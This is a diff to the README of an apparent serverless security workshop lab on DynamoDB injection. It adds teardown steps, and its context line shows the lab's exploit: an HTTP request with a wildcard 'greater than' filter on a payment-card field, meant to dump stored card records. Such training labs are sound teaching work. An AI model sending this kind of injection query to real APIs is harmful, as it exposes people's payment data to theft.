@@ -23,3 +23,8 @@ Now let's run the exploit
 http POST https://xxxx.execute-api.us-east-1.amazonaws.com/api/search db=we45-sls-payments search_term="*" search_operator=GT search_field=payment-card
 
 ```
+
+### Teardown
+
+* In your image, navigate over to `/root/labs/Serverless-Workshop/DynamoDB-Injection`
+* Run `sls remove` to remove stack
